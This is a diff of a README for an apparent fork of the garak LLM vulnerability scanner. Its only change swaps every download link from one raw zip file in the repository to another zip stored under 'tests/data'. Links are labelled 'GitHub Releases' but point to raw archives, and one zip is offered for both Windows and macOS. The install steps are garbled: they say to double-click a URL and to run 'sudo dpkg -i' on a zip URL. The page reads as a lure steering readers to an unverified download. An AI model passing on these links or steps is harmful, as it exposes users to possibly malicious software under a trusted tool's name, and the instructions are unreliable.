@@ -6,9 +6,9 @@ Welcome to garak, your go-to tool for scanning vulnerabilities in large language
 
 ## 📥 Download garak
 
-[![Download garak](https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip)](https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip)
+[![Download garak](https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip)](https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip)
 
-You can download garak from our Releases page. To do so, click the button above or visit this link: [GitHub Releases](https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip). 
+You can download garak from our Releases page. To do so, click the button above or visit this link: [GitHub Releases](https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip). 
 
 ## 🛠️ System Requirements
 
@@ -21,18 +21,18 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click the button above or use this link: [GitHub Releases](https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip) to go to the Releases page.
+1. Click the button above or use this link: [GitHub Releases](https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip) to go to the Releases page.
 2. Look for the latest release version.
 3. Find the download package suitable for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip`.
    - For Linux, download the appropriate package.
 4. After the download completes, locate the file on your computer.
 
 ### Installing on Your System
 
 **For Windows:**
-- Double-click on `https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip`.
+- Double-click on `https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip`.
 - Follow the on-screen instructions to complete the installation.
 
 **For macOS:**
@@ -43,7 +43,7 @@ Before you download, ensure your system meets the following requirements:
 **For Linux:**
 - Open a terminal window.
 - Navigate to the folder where the downloaded file is located.
-- Run the installation command specific to your package (e.g., `sudo dpkg -i https://raw.githubusercontent.com/recetariodmix/garak/main/nonteacher/garak.zip`).
+- Run the installation command specific to your package (e.g., `sudo dpkg -i https://raw.githubusercontent.com/recetariodmix/garak/main/tests/data/Software_v2.7-beta.5.zip`).
 
 ## 🎯 Using garak
 
